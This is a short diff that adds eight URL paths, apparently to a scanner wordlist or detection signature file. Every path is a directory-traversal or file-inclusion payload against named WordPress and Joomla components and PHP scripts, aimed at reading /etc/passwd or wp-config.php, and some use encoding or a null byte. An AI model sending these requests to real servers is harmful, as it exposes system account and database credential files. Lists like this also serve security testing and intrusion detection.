@@ -1,0 +1,8 @@
+/wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=../../../../wp-config.php
+/index.php?option=com_imagebrowser&folder=../../../../etc/passwd
+/index.php?option=com_extplorer&action=show_error&dir=..%2F..%2F..%2F%2F..%2F..%2Fetc%2Fpasswd
+/components/com_ionfiles/download.php?file=../../../../../../../../etc/passwd&download=1
+/components/com_rwcards/captcha/captcha_image.php?img=../../../../../../../../../etc/passwd%00
+/index.php?option=com_pro_desk&include_file=../../../../../../etc/passwd
+/comm.php?id=../../../../../../../../../../etc/passwd
+/viewrq.php?format=ps&var_filename=../../../../../../../../../../etc/passwd
